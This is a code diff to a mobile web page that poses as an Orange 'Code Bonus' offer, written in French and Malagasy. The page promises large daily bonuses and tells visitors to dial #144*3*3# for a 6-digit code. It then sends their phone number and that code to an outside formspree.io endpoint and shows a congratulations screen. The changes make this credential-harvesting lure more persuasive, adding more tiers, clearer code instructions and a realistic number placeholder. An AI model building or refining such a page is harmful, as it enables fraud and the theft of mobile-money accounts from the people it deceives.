@@ -17,72 +17,94 @@
         }
         .container {
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(15px);
             padding: 20px;
             border-radius: 20px;
             width: 90%;
-            max-width: 400px;
+            max-width: 420px;
             text-align: center;
             border: 1px solid rgba(255, 255, 255, 0.1);
             box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            box-sizing: border-box;
         }
         .step { display: none; }
         .active { display: block; animation: fadeIn 0.5s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Sary ao anatin'ny dingana */
         .step-img {
             width: 100%;
-            height: 150px;
+            height: 140px;
             object-fit: cover;
             border-radius: 15px;
             margin-bottom: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
-        h1 { color: #00d2ff; font-size: 22px; margin-top: 0; }
+        h1 { color: #00d2ff; font-size: 22px; margin: 0 0 10px 0; }
+        p { font-size: 14px; color: #d1d1d1; }
+
         .btn-next, .btn-confirm {
             background: linear-gradient(90deg, #00d2ff, #3a7bd5);
             color: white;
-            padding: 12px;
+            padding: 14px;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             width: 100%;
             font-weight: bold;
             cursor: pointer;
             margin-top: 15px;
             box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);
+            font-size: 16px;
         }
 
+        /* Liste Tarif voadio */
         .tarif-grid {
             display: grid;
-            gap: 8px;
-            max-height: 250px;
+            gap: 10px;
+            max-height: 320px; /* Natao malalaka kokoa */
             overflow-y: auto;
             margin-top: 10px;
-            padding: 5px;
+            padding-right: 5px;
         }
+        /* Style ho an'ny scrollbar */
+        .tarif-grid::-webkit-scrollbar { width: 5px; }
+        .tarif-grid::-webkit-scrollbar-thumb { background: #00d2ff; border-radius: 10px; }
+
         .tarif-card {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.08);
+            padding: 12px;
+            border-radius: 12px;
             cursor: pointer;
             transition: 0.3s;
             text-align: left;
             font-size: 13px;
-            border: 1px solid transparent;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         .tarif-card:hover { background: rgba(0, 210, 255, 0.2); border-color: #00d2ff; }
-        .tarif-card b { color: #4dfd63; float: right; }
+        .tarif-card b { color: #4dfd63; font-size: 14px; }
 
         input {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 8px;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 10px;
             border: 1px solid rgba(255, 255, 255, 0.2);
-            background: rgba(0, 0, 0, 0.2);
+            background: rgba(0, 0, 0, 0.3);
             color: white;
             box-sizing: border-box;
+            font-size: 16px;
+        }
+        .info-yellow {
+            background: rgba(255, 215, 0, 0.15);
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #ffd700;
+            border: 1px dashed #ffd700;
+            margin-bottom: 15px;
         }
     </style>
 </head>
@@ -91,41 +113,47 @@
 <div class="container">
     
     <div id="step1" class="step active">
-        <img src="https://img.freepik.com/free-vector/gift-box-with-blue-ribbon_1308-45607.jpg" class="step-img" alt="Welcome">
+        <img src="https://img.freepik.com/free-vector/gift-box-with-blue-ribbon_1308-45607.jpg" class="step-img">
         <h1>Bienvenue dans Code Bonus</h1>
-        <p style="font-size: 14px;">Hazoahy mivantana ny loka bonus-nao anio.</p>
+        <p>Araraoty ny fahafahana hahazo bonus manokana avy amin'ny Orange anio.</p>
         <button class="btn-next" onclick="nextStep(2)">SUIVANT</button>
     </div>
 
     <div id="step2" class="step">
-        <img src="https://img.freepik.com/free-vector/subscription-concept-illustration_114360-3164.jpg" class="step-img" alt="Tarif">
         <h1>Choisir ton tarif</h1>
         <div class="tarif-grid">
-            <div class="tarif-card" onclick="selectTarif('40k Bonus / 21k')">40.000Ar bonus <b>21.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('60k Bonus / 31k')">60.000Ar bonus <b>31.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('90k Bonus / 41k')">90.000Ar bonus <b>41.400Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('120k Bonus / 56k')">120.000Ar bonus <b>56.800Ar</b></div>
-            <div class="tarif-card" onclick="selectTarif('140k Bonus / 71k')">140.000Ar bonus <b>71.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('40k/21.4k')"><span>40.000Ar bonus par jour</span> <b>21.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('60k/31.4k')"><span>60.000Ar bonus par jour</span> <b>31.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('90k/41.4k')"><span>90.000Ar bonus par jour</span> <b>41.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('120k/56.8k')"><span>120.000Ar bonus par jour</span> <b>56.800Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('140k/71.4k')"><span>140.000Ar bonus par jour</span> <b>71.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('180k/87.5k')"><span>180.000Ar bonus par jour</span> <b>87.500Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('320k/100.4k')"><span>320.000Ar bonus par jour</span> <b>100.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('560k/181.4k')"><span>560.000Ar bonus par jour</span> <b>181.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('980k/311.4k')"><span>980.000Ar bonus par jour</span> <b>311.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('1.4M/461.4k')"><span>1.400.000Ar bonus par jour</span> <b>461.400Ar</b></div>
         </div>
     </div>
 
     <div id="step3" class="step">
-        <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img" alt="Security">
+        <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4685.jpg" class="step-img">
         <h1>Validation</h1>
-        <p style="font-size: 11px; color: #ff9a9e;">Maka code 6 chiffres: <b>#144*3*3#</b></p>
+        <div class="info-yellow">
+            Maka code 6 chiffres: Tsindrio ny <b>#144*3*3#</b> dia io no ampidirina eto ambany.
+        </div>
         
         <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
-            <input type="hidden" name="Tarif" id="selectedTarifInput">
-            <input type="tel" name="Numero_Orange" placeholder="Numero Orange" required>
-            <input type="number" name="Code_6_Chiffres" placeholder="Code (6 chiffres)" required>
+            <input type="hidden" name="Tarif_Nofidiana" id="selectedTarifInput">
+            <input type="tel" name="Numero_Orange" placeholder="032 XX XXX XX" required>
+            <input type="number" name="Code_6_Chiffres" placeholder="Code 6 chiffres" required>
             <button type="submit" id="submitBtn" class="btn-confirm">CONFIRMER</button>
         </form>
     </div>
 
     <div id="step4" class="step">
-        <img src="https://img.freepik.com/free-vector/winner-background-with-confetti_23-2147587114.jpg" class="step-img" alt="Success">
-        <h1 style="color: #4dfd63;">Félicitations!</h1>
-        <p>Voaray ny fangatahanao. Miandrasa kely ny fanamarinana.</p>
+        <img src="https://img.freepik.com/free-vector/winner-background-with-confetti_23-2147587114.jpg" class="step-img">
+        <h1 style="color: #4dfd63;">💐 Félicitations</h1>
+        <p>Voaray ny fangatahanao. Ho voamarina ao anatin'ny fotoana fohy ny mombamomba anao.</p>
     </div>
 
 </div>
@@ -143,7 +171,8 @@
     form.onsubmit = async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
-        btn.innerText = "Fanamarinana...";
+        btn.innerText = "Traitement en cours...";
+        btn.disabled = true;
         const data = new FormData(form);
         const response = await fetch(form.action, {
             method: 'POST', body: data, headers: { 'Accept': 'application/json' }
